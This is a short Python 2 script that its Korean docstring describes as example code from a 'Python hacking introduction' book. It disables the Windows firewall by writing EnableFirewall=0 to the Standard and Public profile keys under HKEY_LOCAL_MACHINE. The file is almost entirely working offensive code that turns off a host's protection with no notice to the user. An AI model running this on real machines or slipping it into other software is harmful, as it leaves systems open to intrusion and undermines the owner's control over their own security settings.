#!/usr/bin/env python
#-*- coding: utf-8 -*-
'''
    python ==> 파이썬해킹입문, 윈도우의 레지스트리를 사용해서 방화벽을 제거하는 예제 코드
'''
from _winreg import *
import sys

varSubKey = "SYSTEM\CurrentControlSet\services\SharedAccess\Parameters\FirewallPolicy"
varStd = "\StandardProfile"
varPub = "\PublicProfile"
varEnbKey = "EnableFirewall"                                       
varOff = 0

try:
	varReg = ConnectRegistry(None, HKEY_LOCAL_MACHINE)

	varKey = CreateKey(varReg, varSubKey + varStd)
	SetValueEx(varKey, varEnbKey, 0, REG_DWORD, varOff)
	CloseKey(varKey)

	varKey = CreateKey(varReg, varSubKey + varPub)
	SetValueEx(varKey, varEnbKey, 0, REG_DWORD, varOff)
except:
	errorMsg = "Exception Outter: ", sys.exc_info()[0]
	print errorMsg


CloseKey(varKey)
CloseKey(varReg)


















